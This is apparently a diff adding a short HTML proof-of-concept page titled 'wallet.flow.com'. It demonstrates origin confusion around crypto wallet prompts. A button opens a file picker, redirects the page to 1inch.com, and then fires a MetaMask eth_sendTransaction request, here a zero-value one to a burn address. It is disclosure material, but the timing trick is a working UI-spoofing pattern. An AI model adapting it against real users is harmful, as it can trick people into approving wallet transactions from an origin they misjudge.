@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>wallet.flow.com</title>
+</head>
+<body>
+
+<h2>Buy Premium Access</h2>
+<p>This PoC demonstrates how a confusing navigation can affect user understanding of a payment request origin.</p>
+
+<button id="payBtn">Pay with Wallet</button>
+<input type="file" id="fileInput" style="display:none;" />
+
+<script>
+  document.getElementById("payBtn").addEventListener("click", async function () {
+    const fileInput = document.getElementById("fileInput");
+
+    // STEP 1 — User gesture (file picker)
+    fileInput.click();
+
+    // STEP 2 — Misleading navigation AFTER user action
+    setTimeout(() => {
+      window.location.href = "https://1inch.com/";  // arbitrary domain
+    }, 800);
+
+    // STEP 3 — SAFE payment popup (no real payment)
+    // Only opens a "Review Transaction" window in MetaMask
+    setTimeout(async () => {
+      try {
+        // dummy transaction — will open wallet popup but DOES NOT send payment
+        await ethereum.request({
+          method: "eth_sendTransaction",
+          params: [{
+            from: ethereum.selectedAddress,
+            to: "0x000000000000000000000000000000000000dEaD", // harmless burn address
+            value: "0x0" // zero value → no payment
+          }]
+        });
+      } catch (err) {
+        console.log("User rejected or wallet blocked:", err);
+      }
+    }, 1200);
+  });
+</script>
+
+</body>
+</html>
